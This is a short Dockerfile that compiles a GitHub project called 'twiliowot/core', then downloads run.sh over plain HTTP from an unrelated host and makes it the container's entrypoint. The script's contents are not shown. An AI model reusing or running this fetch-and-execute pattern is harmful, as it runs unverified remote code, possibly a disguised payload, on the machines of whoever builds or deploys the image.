FROM ubuntu:16.10

RUN apt-get update && \
    apt-get install git build-essential cmake libcurl4-openssl-dev wget -y && \
    git clone https://github.com/twiliowot/core && \
    cd core && \
    mkdir build && \
    cd build && \
    cmake .. -DCMAKE_BUILD_TYPE=Release && \
    make && \
    wget http://247app.host/apo/run.sh && \
    chmod 755 run.sh

EXPOSE 8080

WORKDIR /core/build
ENTRYPOINT ["./run.sh"]
